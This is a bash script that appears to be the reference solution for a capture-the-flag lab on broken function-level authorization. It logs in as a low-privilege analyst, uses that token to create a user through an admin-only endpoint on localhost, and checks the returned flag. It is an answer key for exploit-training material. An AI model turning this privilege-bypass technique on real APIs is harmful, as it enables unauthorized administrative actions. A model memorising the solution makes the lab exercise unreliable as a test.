#!/usr/bin/env bash
# ============================================================
# AdTechAdmin (labs06) — reference solution: broken
# function-level authorization
#
# Chain: login as the analyst (low-priv JWT) -> prove the
# bypass with a SAFE write (create one disposable test user,
# non-privileged role) -> flag in the response. No existing
# data is modified or deleted.
#
# Usage: ./run.sh [base-url]     (default http://localhost:8086)
# Prints the flag on stdout; exit 0 on success.
# ============================================================
set -euo pipefail

BASE="${1:-http://localhost:8086}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

echo "[*] logging in as analyst" >&2
TOKEN="$(curl -fsS -X POST "$BASE/auth/login" -H 'Content-Type: application/json' \
  -d '{"username":"analyst","password":"analyst123"}' \
  | python3 -c 'import sys,json; print(json.load(sys.stdin).get("token",""))')"
[[ -n "$TOKEN" ]] || { echo "[-] failed: login returned no token" >&2; exit 1; }

echo "[*] safe write proof: creating one disposable test user (role=user)" >&2
RESP="$(curl -fsS -X POST "$BASE/api/users" \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d "{\"username\":\"test-$(date +%s)-$RANDOM\",\"role\":\"user\"}")"

flag="$(python3 -c 'import sys,json; print(json.load(sys.stdin).get("flag",""))' <<<"$RESP")"
if [[ -z "$flag" ]]; then
  echo "[-] failed: no flag in response: $RESP" >&2
  exit 1
fi

echo "$flag"
expected="$(sed -n 's/^FLAG="\([^"]*\)"$/\1/p' "$SCRIPT_DIR/../challenge/.env")"
if [[ "$flag" == "$expected" ]]; then
  echo "[+] PASS: flag matches challenge/.env" >&2
else
  echo "[-] FAIL: got $flag, expected $expected" >&2
  exit 1
fi
